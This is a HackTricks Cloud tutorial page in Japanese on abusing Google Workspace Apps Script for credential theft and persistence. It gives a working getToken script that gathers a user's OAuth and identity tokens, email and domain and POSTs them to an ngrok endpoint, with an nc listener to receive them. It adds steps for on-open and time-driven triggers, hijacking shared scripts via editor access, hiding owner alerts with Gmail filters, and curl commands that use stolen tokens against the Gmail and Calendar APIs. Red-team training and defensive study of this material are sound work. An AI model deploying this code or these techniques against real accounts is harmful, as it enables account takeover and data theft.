# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scriptsは、**編集者権限を持つユーザーがApp Scriptにリンクされたドキュメントにアクセスしたときにトリガーされるコード**であり、**OAuthプロンプトを受け入れた後**に実行されます。\
また、App Scriptの所有者によって**特定の時間ごとに実行されるように設定することもできます**（持続性）。

### App Scriptの作成

App Scriptを作成する方法はいくつかありますが、最も一般的な方法は**Googleドキュメント（任意のタイプ）から**と**スタンドアロンプロジェクトとして**です：

<details>

<summary>Google Docs、Sheets、またはSlidesからコンテナバウンドプロジェクトを作成する</summary>

1. Docsドキュメント、Sheetsスプレッドシート、またはSlidesプレゼンテーションを開きます。
2. **拡張機能** > **Google Apps Script**をクリックします。
3. スクリプトエディタで、**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて、**名前の変更**をクリックします。

</details>

<details>

<summary>スタンドアロンプロジェクトを作成する</summary>

Apps Scriptからスタンドアロンプロジェクトを作成するには：

1. [`script.google.com`](https://script.google.com/)に移動します。
2. **新しいプロジェクト**を追加します。
3. スクリプトエディタで、**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて、**名前の変更**をクリックします。

</details>

<details>

<summary>Google Driveからスタンドアロンプロジェクトを作成する</summary>

1. [Google Drive](https://drive.google.com/)を開きます。
2. **新規** > **その他** > **Google Apps Script**をクリックします。

</details>

<details>

<summary>Google Formsからコンテナバウンドプロジェクトを作成する</summary>

1. Google Formsでフォームを開きます。
2. その他 more\_vert > **スクリプトエディタ**をクリックします。
3. スクリプトエディタで、**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて、**名前の変更**をクリックします。

</details>

<details>

<summary>claspコマンドラインツールを使用してスタンドアロンプロジェクトを作成する</summary>

`clasp`は、ターミナルからApps Scriptプロジェクトを作成、プル/プッシュ、デプロイするためのコマンドラインツールです。

詳細については、[Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp)を参照してください。

</details>

## App Scriptシナリオ <a href="#create-using-clasp" id="create-using-clasp"></a>

### App ScriptでGoogle Sheetを作成する

App Scriptを作成することから始めます。このシナリオに対する私の推奨は、Google Sheetを作成し、**`拡張機能 > App Scripts`**に移動することです。これにより、**シートにリンクされた新しいApp Scriptが開きます**。

### トークンの漏洩

OAuthトークンへのアクセスを提供するには、**`サービス +`をクリックし、次のようなスコープを追加する必要があります**：

* **AdminDirectory**: ディレクトリのユーザーとグループにアクセス（ユーザーに十分な権限がある場合）
* **Gmail**: Gmailデータにアクセスするため
* **Drive**: Driveデータにアクセスするため
* **Google Sheets API**: トリガーと連携するため

**必要なスコープ**を自分で変更するには、プロジェクト設定に移動し、**`エディタに「appsscript.json」マニフェストファイルを表示`を有効にします**。 

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

リクエストをキャプチャするには、次のように実行するだけです:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
外部リクエストが行われると、OAuthプロンプトは**外部エンドポイントにアクセスするための権限を要求します**。
{% endhint %}

### トリガーの作成

アプリを読み込んだら、**⏰ トリガー**をクリックしてトリガーを作成します。**関数**として**`getToken`**を選択し、デプロイメントは**`Head`**、イベントソースは**`From spreadsheet`**を選択し、イベントタイプは**`On open`**または**`On edit`**（必要に応じて）を選択して保存します。

デバッグしたい場合は、**実行タブでアプリスクリプトの実行を確認できます**。

### 共有

**App Script**を**トリガー**するためには、被害者が**編集者アクセス**で接続する必要があります。

{% hint style="success" %}
**App Script**を実行するために使用される**トークン**は、**トリガーの作成者**のものであり、他のユーザーが編集者としてファイルを開いても変わりません。
{% endhint %}

### 共有されたドキュメントの悪用

{% hint style="danger" %}
誰かが**App Scriptsとトリガーを使用してアプリスクリプトのヘッドを共有した場合**（固定デプロイメントではない）、アプリスクリプトのコードを変更（例えば、トークンを盗む関数を追加）し、アクセスすると、**アプリスクリプトはドキュメントを共有したユーザーの権限で実行されます**！ （トリガーが作成されたときに与えられたアクセススコープを持つオーナーのOAuthトークンに注意してください）。

**スクリプトの作成者に誰かがスクリプトを変更したことを示す通知が送信されます**（アラートを防ぐためにGmailの権限を使用してフィルターを生成するのはどうですか？）
{% endhint %}

{% hint style="success" %}
**攻撃者がApp Scriptのスコープを変更した場合**、更新は**新しいトリガー**が作成されるまでドキュメントに**適用されません**。したがって、攻撃者は、作成したトリガーで設定したスコープよりも多くのスコープを持つオーナーのトークンを盗むことはできません。
{% endhint %}

### 共有の代わりにコピー

ドキュメントを共有するためのリンクを作成すると、次のようなリンクが作成されます：`https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
**"/edit"**の部分を**"/copy"**に変更すると、Googleはアクセスするのではなく、**ドキュメントのコピーを生成するかどうかを尋ねます：**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

ユーザーがコピーしてアクセスすると、**ドキュメントの内容とアプリスクリプトがコピーされます**が、**トリガーはコピーされないため、何も実行されません**。

### ウェブアプリケーションとしての共有

**アプリスクリプトをウェブアプリケーションとして共有することも可能です**（アプリスクリプトのエディタで、ウェブアプリケーションとしてデプロイします）が、次のようなアラートが表示されます：

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

その後、必要な権限を求める**典型的なOAuthプロンプト**が表示されます。

### テスト

収集したトークンを使用してメールをリストするには、次のコマンドをテストできます：

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

ユーザーのカレンダーをリストする:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script as Persistence

持続性のための1つのオプションは、**ドキュメントを作成し、getToken** 関数のトリガーを追加し、攻撃者とドキュメントを共有することです。これにより、攻撃者がファイルを開くたびに、**被害者のトークンを抽出します。**

また、App Scriptを作成し、X時間ごとにトリガーを設定することも可能です（例えば、毎分、毎時、毎日...）。**被害者の資格情報やセッションを侵害した攻撃者は、App Scriptの時間トリガーを設定し、非常に特権のあるOAuthトークンを毎日漏洩させることができます**：

App Scriptを作成し、トリガーに移動し、「トリガーを追加」をクリックし、イベントソースとして「時間駆動」を選択し、あなたに最適なオプションを選択します：

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
これにより、セキュリティアラートメールとモバイルへのプッシュメッセージが作成されます。
{% endhint %}

### Shared Document Unverified Prompt Bypass

さらに、誰かが**編集者アクセス**を持つドキュメントを**共有**した場合、そのドキュメント内に**App Scriptsを生成**することができ、**ドキュメントの所有者（作成者）がApp Scriptの所有者になります**。

{% hint style="warning" %}
これは、**ドキュメントの作成者が、誰でもその中で作成したApp Scriptの作成者として表示されることを意味します**。

また、**App Scriptはドキュメントの作成者のWorkspace環境によって信頼されることを意味します**。
{% endhint %}

{% hint style="danger" %}
これは、**App Scriptがすでに存在し**、人々が**アクセスを許可している場合、ドキュメントに**編集者**権限を持つ誰でも**それを変更し、そのアクセスを悪用できることを意味します。**\
これを悪用するには、App Scriptをトリガーする人々が必要です。そして、1つの便利なトリックは、**スクリプトをウェブアプリとして公開することです**。**すでにApp Scriptに**アクセスを許可した**人々がウェブページにアクセスすると、**App Scriptをトリガーします**（これは`<img>`タグを使用しても機能します）。
{% endhint %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
